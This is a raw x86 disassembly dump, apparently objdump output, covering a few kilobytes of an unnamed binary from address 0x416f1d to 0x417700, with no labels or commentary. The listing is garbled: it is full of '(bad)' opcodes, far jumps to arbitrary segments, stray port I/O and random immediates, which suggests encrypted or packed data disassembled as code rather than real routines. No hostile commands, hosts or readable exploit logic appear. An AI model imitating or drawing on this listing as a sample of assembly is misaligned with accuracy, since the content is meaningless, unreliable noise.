  416f1d:	bnd ja 0x416ec5
  416f20:	scas   al,BYTE PTR es:[edi]
  416f21:	mov    dh,0x33
  416f23:	mov    eax,0x291b0cf
  416f28:	nop
  416f29:	cli    
  416f2a:	pop    ss
  416f2b:	cld    
  416f2c:	pop    ebx
  416f2d:	sub    ecx,DWORD PTR [ebx]
  416f2f:	jmp    0xe186:0x6258637f
  416f36:	mov    dh,0x27
  416f38:	in     al,0x48
  416f3a:	fsubr  DWORD PTR [edx+0x2f]
  416f3d:	mov    esi,0xa3a01eb5
  416f42:	sub    eax,0xc41dd4ec
  416f47:	adc    al,0x2f
  416f49:	int    0x55
  416f4b:	jnp    0x416f12
  416f4d:	(bad)  
  416f4e:	retf   
  416f4f:	add    BYTE PTR [eax-0x74],bl
  416f52:	mov    WORD PTR [ecx],fs
  416f54:	inc    eax
  416f55:	jmp    0x4173:0xaebde809
  416f5c:	xchg   ebx,eax
  416f5d:	ins    DWORD PTR es:[edi],dx
  416f5e:	imul   eax,DWORD PTR [ebx],0xffffffa8
  416f61:	iret   
  416f62:	mov    ds:0x652de276,al
  416f67:	test   DWORD PTR [eax-0xba30d82],ebp
  416f6d:	jno    0x416f71
  416f6f:	mov    ah,0x92
  416f71:	rol    BYTE PTR [edx],0xd
  416f74:	psadbw mm2,QWORD PTR [edi+0x34fb4fa7]
  416f7b:	xchg   edi,eax
  416f7c:	mov    ecx,0xd7269be7
  416f81:	daa    
  416f82:	leave  
  416f83:	mov    dl,0x58
  416f85:	mov    ax,0xe03f
  416f89:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  416f8b:	in     al,dx
  416f8c:	dec    eax
  416f8d:	(bad)  
  416f8e:	or     al,0xad
  416f90:	sbb    DWORD PTR ds:0xcdc06cb0,0xcd60debd
  416f9a:	imul   edx,eax,0xcb6771ce
  416fa0:	xor    DWORD PTR [ecx-0x25],esi
  416fa3:	or     ecx,DWORD PTR [esi+esi*4-0x6c27581]
  416faa:	cmp    esi,edx
  416fac:	lea    eax,[ebx]
  416fae:	cmp    ch,BYTE PTR ds:0x69247e97
  416fb4:	cli    
  416fb5:	adc    eax,0xf578c23a
  416fba:	xor    al,0xe0
  416fbc:	jl     0x416fea
  416fbe:	mov    dh,0x7b
  416fc0:	(bad)  
  416fc1:	jl     0x416f7d
  416fc3:	push   0x60
  416fc5:	xchg   esi,eax
  416fc6:	mov    cl,0xda
  416fc8:	fbld   TBYTE PTR [ecx]
  416fca:	test   DWORD PTR [ebx-0x57],ebp
  416fcd:	outs   dx,DWORD PTR ds:[esi]
  416fce:	lea    ecx,[ebp+0x76]
  416fd1:	and    eax,0x849244b8
  416fd6:	adc    eax,0x3ae52302
  416fdb:	pop    ss
  416fdc:	push   ebp
  416fdd:	cmp    DWORD PTR [ebx+ecx*4],0x5ee615d9
  416fe4:	rcr    DWORD PTR [eax+0x643164c5],0xd3
  416feb:	add    DWORD PTR [edi-0x7b41879c],ebp
  416ff1:	add    eax,0x9921da58
  416ff6:	retf   
  416ff7:	xchg   bh,dh
  416ff9:	stc    
  416ffa:	out    dx,eax
  416ffb:	push   ss
  416ffc:	call   0xff5fea81
  417001:	into   
  417002:	mov    WORD PTR [eax-0x71],cs
  417005:	inc    esp
  417006:	(bad)  
  417007:	ret    
  417008:	jmp    0xf68e7de7
  41700d:	(bad)  
  41700f:	add    DWORD PTR [edi+edx*2-0x30],esi
  417013:	cli    
  417014:	gs dec ebp
  417016:	sub    esi,ebp
  417018:	inc    esi
  417019:	mov    eax,0xe3f75e24
  41701e:	adc    al,0x1d
  417020:	retf   0x3c75
  417023:	sahf   
  417024:	inc    edi
  417025:	push   esi
  417026:	push   cs
  417027:	push   cs
  417028:	adc    DWORD PTR [edx+0x71e98c84],esp
  41702e:	pop    esi
  41702f:	or     ebx,edi
  417031:	adc    DWORD PTR [esp+edi*2+0xc2e8489],ebx
  417038:	clc    
  417039:	cmp    eax,0x6a2682fc
  41703e:	mov    ebp,0x331b8f1b
  417043:	jb     0x4170a7
  417045:	cmp    eax,0x77a527d5
  41704a:	js     0x417055
  41704c:	xor    cl,BYTE PTR [esi-0x5453c246]
  417052:	stc    
  417053:	leave  
  417054:	and    ebx,DWORD PTR [edi]
  417056:	adc    ebx,DWORD PTR [esi-0x5cbefda0]
  41705c:	mov    es,WORD PTR ds:0xc8199337
  417062:	leave  
  417063:	xchg   edx,eax
  417064:	fst    QWORD PTR [ebp+0x4f3bd40e]
  41706a:	cmove  esi,DWORD PTR [edx]
  41706d:	retf   0x403f
  417070:	mov    edi,0x20a40f80
  417075:	ror    dl,cl
  417077:	adc    edx,esp
  417079:	sbb    esp,DWORD PTR [edi-0xef96cad]
  41707f:	mov    ecx,0x15299420
  417084:	inc    ecx
  417085:	cld    
  417086:	pop    esi
  417087:	sbb    esp,DWORD PTR [ebx]
  417089:	jle    0x4170d8
  41708b:	hlt    
  41708c:	mov    ecx,0x1fb48b3e
  417091:	call   DWORD PTR [ecx*2+0x2d9e1a1d]
  417098:	xor    BYTE PTR [edi],dl
  41709a:	ret    
  41709b:	loope  0x41706a
  41709d:	bound  ebx,QWORD PTR [ebx-0x5b]
  4170a0:	cli    
  4170a1:	loop   0x417072
  4170a3:	cli    
  4170a4:	fnstcw WORD PTR [edi]
  4170a6:	add    al,0x8a
  4170a8:	adc    DWORD PTR es:[esi-0xac4a809],0xffffff80
  4170b0:	aas    
  4170b1:	jp     0x4170f1
  4170b3:	jno    0x417068
  4170b5:	sbb    dh,BYTE PTR [eax]
  4170b7:	out    0xf1,al
  4170b9:	xor    edx,DWORD PTR [ecx+0x65bebf49]
  4170bf:	outs   dx,DWORD PTR ds:[esi]
  4170c0:	ss icebp 
  4170c2:	pop    eax
  4170c3:	jmp    0xd6a8:0x502d0b5e
  4170ca:	pop    esp
  4170cb:	pop    eax
  4170cc:	push   ebx
  4170cd:	sbb    al,0x25
  4170cf:	jle    0x41710c
  4170d1:	add    al,0xf7
  4170d3:	push   ebp
  4170d4:	fsub   QWORD PTR [eax+edx*1+0x5f]
  4170d8:	inc    ecx
  4170d9:	inc    ecx
  4170da:	cmp    ebx,DWORD PTR [ebp-0x41]
  4170dd:	lods   al,BYTE PTR ds:[esi]
  4170de:	adc    bh,bl
  4170e0:	xor    ebx,eax
  4170e2:	fiadd  WORD PTR [edi]
  4170e4:	rol    DWORD PTR [ebx],cl
  4170e6:	jne    0x4170bf
  4170e8:	adc    al,0x6
  4170ea:	jne    0x417166
  4170ec:	push   0xffffffbb
  4170ee:	push   es
  4170ef:	pop    es
  4170f0:	mov    edi,0xd883a257
  4170f5:	lods   al,BYTE PTR ds:[esi]
  4170f6:	cld    
  4170f7:	(bad)  
  4170f8:	(bad)  
  4170f9:	cld    
  4170fa:	icebp  
  4170fb:	push   ebp
  4170fc:	adc    DWORD PTR [edi-0x1c],edi
  4170ff:	das    
  417100:	cmp    ebx,DWORD PTR [esi-0x18]
  417103:	add    dl,cl
  417105:	dec    ebx
  417106:	(bad)
  417109:	add    al,0xc1
  41710b:	mov    BYTE PTR [esi-0x4a6d2311],al
  417111:	cmc    
  417112:	mov    bl,0xcb
  417114:	fdivr  st,st(3)
  417116:	mov    edx,0xd63f663d
  41711b:	inc    eax
  41711c:	mov    dh,0xf6
  41711e:	push   edx
  41711f:	fprem  
  417121:	dec    edi
  417122:	fwait
  417123:	cmp    bh,BYTE PTR [eax+0x1db9f8de]
  417129:	in     eax,0xf0
  41712b:	xchg   ecx,eax
  41712c:	push   esp
  41712d:	jb     0x417134
  41712f:	retf   
  417130:	sbb    eax,0x95b0a4bf
  417135:	xchg   esi,eax
  417136:	and    al,0xa9
  417138:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417139:	repnz push ds
  41713b:	cmp    ebp,eax
  41713d:	popa   
  41713e:	imul   esp,DWORD PTR [edx],0xffffffc1
  417141:	mov    dl,0xc0
  417143:	xchg   edi,eax
  417144:	into   
  417145:	icebp  
  417146:	adc    al,0xdf
  417148:	rcr    BYTE PTR [eax+0x6a],cl
  41714b:	sti    
  41714c:	test   BYTE PTR [ebp+edi*4+0x29],0xe4
  417151:	stc    
  417152:	or     esp,DWORD PTR ds:0x610a3071
  417158:	test   DWORD PTR [eax-0x49],edx
  41715b:	ret    0xc42b
  41715e:	push   ebx
  41715f:	ret    0x4876
  417162:	pop    ebx
  417163:	je     0x41713e
  417165:	inc    esi
  417166:	std    
  417167:	mov    esp,0xb558efe6
  41716c:	ja     0x41712e
  41716e:	pop    edi
  41716f:	cmp    al,0xe0
  417171:	and    eax,ebx
  417173:	ss in  al,0xb7
  417176:	add    al,0xf
  417178:	xor    edi,DWORD PTR [ebx-0xa]
  41717b:	aad    0x1a
  41717d:	xchg   ebx,eax
  41717e:	add    ecx,edx
  417180:	loopne 0x417122
  417182:	nop
  417183:	dec    edx
  417184:	jle    0x417129
  417186:	add    al,BYTE PTR [ebx]
  417188:	data16 jbe 0x4171a2
  41718b:	stos   DWORD PTR es:[edi],eax
  41718c:	push   0xadcc0d97
  417191:	mov    ss,WORD PTR [esi+eax*8+0x7e2824aa]
  417198:	popf   
  417199:	mov    edi,0x87219b2a
  41719e:	mov    ah,0x4e
  4171a0:	retf   0xaf39
  4171a3:	cdq    
  4171a4:	mov    DWORD PTR [esi+0x48],ebx
  4171a7:	rol    DWORD PTR [ebx+0x9],1
  4171aa:	mov    eax,ss
  4171ac:	es (bad) 
  4171af:	jecxz  0x417160
  4171b1:	(bad)  
  4171b2:	cmp    DWORD PTR [edi+eax*2+0x4e1f96a2],ebp
  4171b9:	pop    edx
  4171ba:	clc    
  4171bb:	fidivr DWORD PTR [edi-0x79]
  4171be:	jl     0x41722b
  4171c0:	lock push esp
  4171c2:	rcl    DWORD PTR [edi+eiz*2-0xf4c813],cl
  4171c9:	loop   0x4171c7
  4171cb:	sub    BYTE PTR [ebp-0xf],0x29
  4171cf:	enter  0x4b5,0x5d
  4171d3:	push   ss
  4171d4:	mov    edx,0x2a660ae9
  4171d9:	ret    
  4171da:	adc    dh,BYTE PTR [ebx-0x4c]
  4171dd:	je     0x4171fb
  4171df:	stos   DWORD PTR es:[edi],eax
  4171e0:	xor    DWORD PTR [ecx],ecx
  4171e2:	mov    edx,0xe22034d9
  4171e7:	les    esp,FWORD PTR [ebp+0x41]
  4171ea:	cdq    
  4171eb:	nop
  4171ec:	xor    eax,0xf5763271
  4171f1:	jecxz  0x41718f
  4171f3:	fcomp  DWORD PTR [ebx+0x6e6c7a1b]
  4171f9:	data16 mov ds:0xa12f0dc6,al
  4171ff:	push   cs
  417200:	das    
  417201:	pop    ebp
  417202:	jmp    0x8221fd33
  417207:	test   BYTE PTR [edx],dh
  417209:	adc    eax,0xa9358a41
  41720e:	mov    DWORD PTR [ecx],0x5bec6a69
  417214:	inc    esp
  417215:	mov    bh,0x4a
  417217:	sbb    edi,DWORD PTR [ebp+0x53]
  41721a:	cmp    ebp,eax
  41721c:	outs   dx,BYTE PTR ds:[esi]
  41721d:	out    dx,eax
  41721e:	mov    esp,0xb9b6d697
  417223:	dec    edi
  417224:	jl     0x4171a8
  417226:	jg     0x417242
  417228:	cli    
  417229:	or     DWORD PTR [edx+edx*2-0x67],esi
  41722d:	nop
  41722e:	lods   eax,DWORD PTR ds:[esi]
  41722f:	stos   BYTE PTR es:[edi],al
  417230:	fs pop es
  417232:	in     al,0xd8
  417234:	and    ebp,DWORD PTR [esi]
  417236:	sub    ah,BYTE PTR [edi]
  417238:	and    DWORD PTR [esi+0x59d4434b],0xffffff87
  41723f:	and    al,0xe0
  417241:	jnp    0x4172b7
  417243:	push   esp
  417244:	cmp    BYTE PTR [edi],ch
  417246:	xchg   esi,eax
  417247:	pmullw mm0,QWORD PTR [edx-0x31]
  41724b:	stc    
  41724c:	fimul  DWORD PTR [ebx+0x7b]
  41724f:	into   
  417250:	xor    eax,0x74c95214
  417255:	adc    eax,DWORD PTR [ebx-0x10]
  417258:	rol    cl,cl
  41725a:	sbb    al,0x9c
  41725c:	sub    edx,edx
  41725e:	xchg   edi,eax
  41725f:	lea    eax,[ebx]
  417261:	mov    edi,ss
  417263:	sahf   
  417264:	cdq    
  417265:	ds dec edx
  417267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417268:	lahf   
  417269:	pop    edx
  41726a:	dec    esp
  41726b:	inc    edi
  41726c:	mov    bh,0xe7
  41726e:	shl    DWORD PTR [edx+ebx*8-0x44],1
  417272:	mov    bl,0xca
  417274:	mov    esp,0x609688c8
  417279:	loope  0x4172ed
  41727b:	mov    al,ds:0x8c7ad798
  417280:	dec    esi
  417281:	dec    ebp
  417282:	inc    ebx
  417284:	jb     0x417211
  417286:	pop    ebp
  417287:	in     eax,0x18
  417289:	jmp    FWORD PTR [ecx]
  41728b:	adc    edi,edi
  41728d:	fnsave [esi-0x54e80b05]
  417293:	dec    esi
  417294:	or     al,BYTE PTR [edx]
  417296:	repnz mov gs,WORD PTR [edx+esi*8-0x1b]
  41729b:	ret    
  41729c:	test   DWORD PTR [ecx+edx*8-0x75b5dfcb],0x42a9b829
  4172a7:	mov    ebx,0xc97dd976
  4172ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172ad:	and    al,0x8d
  4172af:	bound  edi,QWORD PTR [ecx]
  4172b1:	inc    ecx
  4172b2:	cs pushf 
  4172b4:	loop   0x41730b
  4172b6:	xlat   BYTE PTR ds:[ebx]
  4172b7:	pop    es
  4172b8:	mov    ecx,0xa323871f
  4172bd:	mov    bl,0xf8
  4172bf:	neg    DWORD PTR [ebp+0x1a]
  4172c2:	adc    esi,DWORD PTR [eax+0x7eca9a69]
  4172c8:	jge    0x41724b
  4172ca:	pop    esi
  4172cb:	adc    edi,DWORD PTR [ebp+0x73]
  4172ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172cf:	add    DWORD PTR [esi-0x7e],0x63
  4172d3:	cmp    eax,0x300b5bab
  4172d8:	jb     0x417260
  4172da:	imul   edi,edi,0x3
  4172dd:	lds    edx,FWORD PTR [eax-0x396b3d5c]
  4172e3:	xor    ebx,edi
  4172e5:	mov    ebx,edx
  4172e7:	je     0x417307
  4172e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172ea:	sbb    DWORD PTR [edx-0x44],ecx
  4172ed:	addr16 dec esi
  4172ef:	jl     0x417294
  4172f1:	jmp    0x357443e5
  4172f6:	inc    edi
  4172f7:	sbb    al,0xb3
  4172f9:	call   FWORD PTR [esi-0x2ffff085]
  4172ff:	cmp    DWORD PTR [eax-0x50ab6fe6],esi
  417305:	push   esi
  417306:	cmp    al,0x60
  417309:	jle    0x417358
  41730b:	mov    edx,0xeb9cff4f
  417310:	dec    esp
  417311:	aam    0x1c
  417313:	jno    0x4172b2
  417315:	repz cli 
  417317:	cmp    al,0xb
  417319:	fsub   QWORD PTR [ebx]
  41731b:	pop    ds
  41731c:	stc    
  41731d:	xchg   esp,eax
  41731e:	rol    BYTE PTR [ebx-0x68ed8ae8],cl
  417324:	test   eax,0xc3d732a7
  417329:	rcr    BYTE PTR [edx],cl
  41732b:	inc    edx
  41732c:	mov    bl,0x22
  41732e:	push   es
  41732f:	add    al,0x53
  417331:	adc    BYTE PTR [ebx+0x43],al
  417334:	jo     0x4172cf
  417336:	dec    esp
  417337:	arpl   WORD PTR [edx+esi*8],bx
  41733a:	mov    dh,0x4a
  41733c:	dec    ebx
  41733d:	in     al,0x5e
  41733f:	js     0x4172ff
  417341:	xchg   esi,eax
  417342:	push   eax
  417343:	es jne 0x4173bf
  417346:	pop    ss
  417347:	mov    ch,0xc0
  417349:	sub    eax,0x860e14eb
  41734e:	inc    ebp
  41734f:	pop    ss
  417350:	inc    edi
  417351:	sbb    bh,BYTE PTR [ebp-0x2b]
  417354:	xchg   DWORD PTR [edi],ecx
  417356:	inc    esp
  417357:	dec    ebx
  417358:	popf   
  417359:	inc    edi
  41735a:	mov    ds:0x1aeb14f3,al
  41735f:	out    dx,al
  417360:	mov    ds:0x31be1ca4,eax
  417365:	clc    
  417366:	(bad)  
  417367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417368:	ror    BYTE PTR [eax+0x3c],0x4
  41736c:	into   
  41736d:	out    dx,eax
  41736e:	push   ebx
  41736f:	mov    eax,ds:0x6b942f1f
  417374:	aam    0x25
  417376:	push   cs
  417377:	mov    bh,0xb4
  417379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41737a:	aas    
  41737b:	jnp    0x417380
  41737d:	or     dl,bh
  41737f:	and    al,0x5d
  417381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417382:	sub    eax,0x4c17cd33
  417387:	mov    al,ds:0x3f8e6ca5
  41738c:	pop    ecx
  41738d:	jb     0x4173e9
  41738f:	inc    edi
  417390:	xor    eax,0x888a73eb
  417395:	sub    DWORD PTR [eax-0x64],esi
  417398:	retf   0x6614
  41739b:	add    ebx,DWORD PTR [edx]
  41739d:	mov    ebx,0x290bf060
  4173a2:	mov    dh,0xfc
  4173a4:	fild   DWORD PTR [ebp+0x6ccc4cb5]
  4173aa:	ret    0x78a7
  4173ad:	dec    esp
  4173ae:	bound  eax,QWORD PTR [ebp-0x19]
  4173b1:	scas   eax,DWORD PTR es:[edi]
  4173b2:	inc    ebp
  4173b3:	dec    ebx
  4173b4:	jb     0x41740c
  4173b6:	jle    0x4173d2
  4173b8:	in     eax,0x84
  4173ba:	aam    0x5
  4173bc:	and    eax,0x66aac914
  4173c1:	fild   WORD PTR ds:0x5f8484fa
  4173c7:	sub    ah,al
  4173c9:	in     al,0x12
  4173cb:	stos   BYTE PTR es:[edi],al
  4173cc:	aad    0x41
  4173ce:	mov    ds:0xd3589ce1,eax
  4173d3:	dec    ebx
  4173d4:	and    DWORD PTR [edx],0xa7dca6af
  4173da:	fdivr  st(4),st
  4173dc:	popa   
  4173dd:	ret    0x438e
  4173e0:	ja     0x41745f
  4173e2:	ror    BYTE PTR [ebp-0xc6ba3ef],0xea
  4173e9:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173eb:	dec    eax
  4173ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173ed:	sbb    dl,cl
  4173ef:	and    DWORD PTR [ebp+0x47f7b469],esi
  4173f5:	test   esp,esi
  4173f7:	and    dl,dh
  4173f9:	addr16 and eax,esi
  4173fc:	mov    dl,0x90
  4173fe:	jecxz  0x4173fb
  417400:	loopne 0x41738c
  417402:	or     DWORD PTR ds:0x42dc52ec,edi
  417408:	cmp    bh,BYTE PTR [esi+0x2c2699e2]
  41740e:	fwait
  41740f:	mov    eax,ds:0xf44f430f
  417414:	sbb    ah,BYTE PTR ss:[ecx+0x66f24dad]
  41741b:	push   eax
  41741c:	cmovs  edi,DWORD PTR [ebp+0x5c5aaf2d]
  417423:	xor    bl,dl
  417425:	ins    BYTE PTR es:[edi],dx
  417426:	mov    esp,?
  417428:	sar    bl,0x6c
  41742b:	jmp    0x9542:0x408fe657
  417432:	stos   BYTE PTR es:[edi],al
  417433:	in     eax,0x71
  417435:	gs xor edx,esi
  417438:	scas   eax,DWORD PTR es:[edi]
  417439:	cdq    
  41743a:	and    al,0x11
  41743c:	rcl    eax,0x82
  41743f:	daa    
  417440:	sbb    eax,edx
  417442:	sub    edx,eax
  417444:	ret    0x2fd6
  417447:	jbe    0x4174ac
  417449:	leave  
  41744a:	inc    ebp
  41744b:	(bad)  
  41744c:	push   esp
  41744d:	jmp    0x9dc4:0x8694555
  417454:	pop    ss
  417455:	dec    ecx
  417456:	and    BYTE PTR [ecx],dl
  417458:	or     BYTE PTR [edx-0x61],al
  41745b:	jg     0x417409
  41745d:	js     0x417489
  41745f:	jmp    0x7c27eee4
  417464:	sar    DWORD PTR [ebx],cl
  417466:	pusha  
  417467:	pop    edi
  417468:	jo     0x417404
  41746a:	test   BYTE PTR [edx+edx*1-0x79],0x29
  41746f:	stos   DWORD PTR es:[edi],eax
  417470:	push   es
  417471:	sbb    esp,DWORD PTR [edi-0x2e58819c]
  417477:	mov    ch,0x47
  417479:	popf   
  41747a:	popf   
  41747b:	mov    eax,ds:0x3715dcd5
  417480:	mov    WORD PTR [ebp+0x16],es
  417483:	ins    BYTE PTR es:[edi],dx
  417484:	call   DWORD PTR [eax+0x6a]
  417487:	cmp    ah,bl
  417489:	fwait
  41748a:	sub    BYTE PTR [esi],dh
  41748c:	jo     0x417500
  41748e:	and    eax,DWORD PTR [esi-0x2651364b]
  417494:	addr16 mov bl,0xa1
  417497:	push   0xffffffa4
  417499:	mov    al,ds:0x8934ebed
  41749e:	push   esi
  41749f:	xlat   BYTE PTR ds:[ebx]
  4174a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174a1:	or     DWORD PTR [esi],0x51
  4174a4:	dec    esp
  4174a5:	cmp    eax,0xc9b87ab1
  4174aa:	imul   edx,DWORD PTR [edx],0xb444a05b
  4174b0:	xchg   edx,eax
  4174b1:	fild   WORD PTR [edx+0x689aedbd]
  4174b7:	xchg   ecx,eax
  4174b8:	jmp    0x41746d
  4174ba:	js     0x417478
  4174bc:	ja     0x41750b
  4174be:	stos   BYTE PTR es:[edi],al
  4174bf:	push   0xffffff8b
  4174c1:	mov    ds:0x18ede58e,eax
  4174c6:	pop    ss
  4174c7:	fadd   DWORD PTR [ecx-0x47]
  4174ca:	(bad)  
  4174cb:	sbb    ecx,DWORD PTR [ebp+ebx*4-0x64a316ed]
  4174d2:	sbb    al,0xd4
  4174d4:	leave  
  4174d5:	test   al,0xd6
  4174d7:	dec    ebp
  4174d8:	pop    esp
  4174d9:	fsub   DWORD PTR [edi+0x31c40754]
  4174df:	retf   0xb04c
  4174e2:	fpatan 
  4174e4:	pop    edi
  4174e5:	(bad)  
  4174e6:	jge    0x417483
  4174e8:	push   eax
  4174e9:	bnd jns 0x4174d4
  4174ec:	fisubr DWORD PTR [edx-0x352c13d5]
  4174f2:	push   ebx
  4174f3:	(bad)  
  4174f4:	dec    ebp
  4174f5:	enter  0x83fe,0xe
  4174f9:	test   ecx,esp
  4174fb:	cmp    eax,0x144b555d
  417500:	in     al,dx
  417501:	fiadd  DWORD PTR [esi+0x34]
  417504:	stos   DWORD PTR es:[edi],eax
  417505:	aas    
  417506:	test   DWORD PTR [eax-0x5e],edx
  417509:	or     al,0xa7
  41750b:	mov    esi,0xabc57d75
  417510:	pop    ebx
  417511:	cmp    ecx,DWORD PTR [ebx+0x5]
  417514:	sub    esp,DWORD PTR [ebx]
  417516:	in     al,dx
  417517:	lock mov bl,0x1
  41751a:	test   eax,0xf4b7007d
  41751f:	jmp    0x41753e
  417521:	and    ch,dh
  417523:	mov    cl,0xe6
  417525:	mov    esp,0x68bd60f9
  41752a:	je     0x4174b1
  41752c:	jbe    0x417592
  41752e:	sub    eax,0x6d679e8f
  417533:	and    eax,0x54
  417536:	cs ret 
  417538:	or     BYTE PTR [ebp+0xc],0xaa
  41753c:	stc    
  41753d:	popa   
  41753e:	popfw  
  417540:	ret    0x56be
  417543:	int3   
  417544:	rol    BYTE PTR [edx-0x3],1
  417547:	pop    ss
  417548:	scas   eax,DWORD PTR es:[edi]
  417549:	inc    edi
  41754a:	add    ebp,ebp
  41754c:	repz cwde 
  41754e:	pop    ecx
  41754f:	call   0xb5f7:0xa29265ce
  417556:	add    eax,DWORD PTR [edi*2+0x29297b85]
  41755d:	push   edi
  41755e:	in     al,0xaa
  417560:	ds sub ah,bh
  417563:	jnp    0x4175c2
  417565:	dec    ebp
  417566:	sbb    eax,0x388eff15
  41756b:	(bad)  
  41756c:	xchg   BYTE PTR [esi],dl
  41756e:	into   
  41756f:	xor    al,0xd9
  417571:	xlat   BYTE PTR ds:[ebx]
  417572:	ins    BYTE PTR es:[edi],dx
  417573:	cmp    dl,cl
  417575:	lods   al,BYTE PTR ds:[esi]
  417576:	inc    ecx
  417577:	outs   dx,BYTE PTR ds:[esi]
  417578:	test   BYTE PTR [ebp+0x15],ch
  41757b:	sbb    BYTE PTR [ebp+0x64],bh
  41757e:	mov    ds:0xc3555d4,eax
  417583:	mov    edx,0x56330e2b
  417588:	lods   al,BYTE PTR ds:[esi]
  417589:	jmp    0xc630:0xbca7a217
  417590:	and    ebp,ebx
  417592:	ffree  st(6)
  417594:	xor    eax,0x1988aaab
  417599:	xchg   esp,eax
  41759a:	push   esi
  41759b:	mov    ds:0x89191742,al
  4175a0:	inc    ebp
  4175a1:	sahf   
  4175a2:	daa    
  4175a3:	rcr    DWORD PTR [eax-0x22965e62],0x2b
  4175aa:	mov    esi,0x12e18af5
  4175af:	ins    BYTE PTR es:[edi],dx
  4175b0:	jl     0x417586
  4175b2:	jl     0x417580
  4175b4:	out    dx,al
  4175b5:	outs   dx,DWORD PTR ds:[esi]
  4175b6:	arpl   WORD PTR ss:[edi-0x2e],si
  4175ba:	imul   BYTE PTR [edx+0x57]
  4175bd:	outs   dx,DWORD PTR ds:[esi]
  4175be:	loopne 0x417540
  4175c0:	xchg   esi,eax
  4175c1:	mov    DWORD PTR [ecx+0x54],edi
  4175c4:	ja     0x417641
  4175c6:	int3   
  4175c7:	lods   al,BYTE PTR ds:[esi]
  4175c8:	push   esp
  4175c9:	int3   
  4175ca:	loop   0x417632
  4175cc:	mov    eax,ds:0x594f421c
  4175d1:	sub    dh,bh
  4175d3:	ficom  DWORD PTR [eax+0x48]
  4175d6:	test   al,0x85
  4175d8:	pop    edi
  4175d9:	stos   BYTE PTR es:[edi],al
  4175da:	inc    edx
  4175db:	aaa    
  4175dc:	push   ebx
  4175dd:	push   cs
  4175de:	loope  0x417618
  4175e0:	in     eax,dx
  4175e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175e2:	and    BYTE PTR [ecx-0x4bdf3a73],dh
  4175e8:	out    0xd4,al
  4175ea:	add    bh,bh
  4175ec:	mov    esi,0x44e49e3b
  4175f1:	retf   
  4175f2:	lahf   
  4175f3:	sbb    ch,BYTE PTR [eax+0x95e7e7b]
  4175f9:	push   cs
  4175fa:	xor    ch,ah
  4175fc:	lds    ebp,FWORD PTR [eax+0x1f2b518a]
  417602:	cmp    eax,DWORD PTR [ebp+0x6949465b]
  417608:	lods   eax,DWORD PTR ds:[esi]
  417609:	aad    0xa5
  41760b:	fdiv   QWORD PTR [ebp+0x79]
  41760e:	into   
  41760f:	push   eax
  417610:	in     al,0x3c
  417612:	dec    esp
  417613:	xor    eax,0xc5b3154e
  417618:	pop    ds
  417619:	ret    
  41761a:	mov    ds:0x9bdde0ab,eax
  41761f:	outs   dx,DWORD PTR ds:[esi]
  417620:	mov    ebx,0x302d7a85
  417625:	bound  esp,QWORD PTR [esi+0x7e]
  417628:	jle    0x4175bf
  41762a:	sub    bh,BYTE PTR [ecx-0x659d8c92]
  417630:	push   ss
  417631:	(bad)  
  417632:	addr16 pop ebp
  417634:	dec    esi
  417635:	dec    eax
  417636:	cmp    DWORD PTR [eax],0xffffffbb
  417639:	dec    eax
  41763a:	jge    0x41767e
  41763c:	mov    ecx,0x45ffa85a
  417641:	jnp    0x41769d
  417643:	adc    eax,0xf516241
  417648:	adc    BYTE PTR [eax+0x465d5f8],0x28
  41764f:	xchg   edi,eax
  417650:	test   BYTE PTR [edi-0x2cb2fc84],ah
  417656:	ror    eax,1
  417658:	push   0x74
  41765a:	dec    edi
  41765b:	pop    ecx
  41765c:	popa   
  41765d:	jbe    0x417650
  41765f:	jl     0x41763d
  417661:	mov    edi,0xc782d5a1
  417666:	mov    dl,0xa6
  417668:	fldenv [ecx+0x2b]
  41766b:	jle    0x41769b
  41766d:	adc    eax,0x4a62aa3
  417672:	(bad)  
  417674:	adc    eax,0x3ea8ff81
  417679:	inc    ebx
  41767a:	movq   QWORD PTR [eax-0x25],mm6
  41767e:	add    eax,0xeafe7dad
  417683:	scas   eax,DWORD PTR es:[edi]
  417684:	or     bh,BYTE PTR [eax+0x4c4af52e]
  41768a:	push   edi
  41768b:	adc    esp,0xa
  41768e:	mov    es,WORD PTR [edx]
  417690:	push   edx
  417691:	cmpxchg ecx,edx
  417694:	test   al,0xa1
  417696:	(bad)  [eax-0x425c024a]
  41769c:	test   DWORD PTR [edi],esi
  41769e:	clc    
  41769f:	and    DWORD PTR [eax-0x7cb7d8d0],esi
  4176a5:	jecxz  0x4176e6
  4176a7:	aas    
  4176a8:	xor    ebx,DWORD PTR [edi-0x6b8b3854]
  4176ae:	stos   DWORD PTR es:[edi],eax
  4176af:	(bad)  
  4176b0:	xor    DWORD PTR [esi+eiz*2],edx
  4176b3:	arpl   WORD PTR [esi],sp
  4176b5:	stos   BYTE PTR es:[edi],al
  4176b6:	rcl    DWORD PTR [ecx-0x24816332],1
  4176bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176bd:	inc    esp
  4176be:	sbb    al,0xee
  4176c0:	popf   
  4176c1:	mov    bl,0xb8
  4176c3:	cmp    edx,DWORD PTR [esi-0x1e31a276]
  4176c9:	jle    0x4176d4
  4176cb:	and    ecx,DWORD PTR [ebx+0x6e3fac05]
  4176d1:	sub    ah,ch
  4176d3:	mov    BYTE PTR [ecx-0x72],ah
  4176d6:	cmp    esi,esp
  4176d8:	lock mov al,ds:0xe60cbf4d
  4176de:	fwait
  4176df:	jecxz  0x41774d
  4176e1:	mov    ch,bh
  4176e3:	div    BYTE PTR [edi+eiz*2]
  4176e6:	bsr    ebx,DWORD PTR [esi+0x46]
  4176ea:	dec    ecx
  4176eb:	out    0xef,al
  4176ed:	popa   
  4176ee:	sub    dh,al
  4176f0:	or     BYTE PTR ds:0x6ded6785,bh
  4176f6:	test   eax,0xb90beb86
  4176fb:	add    eax,0x8fcc2c2f
  417700:	nop
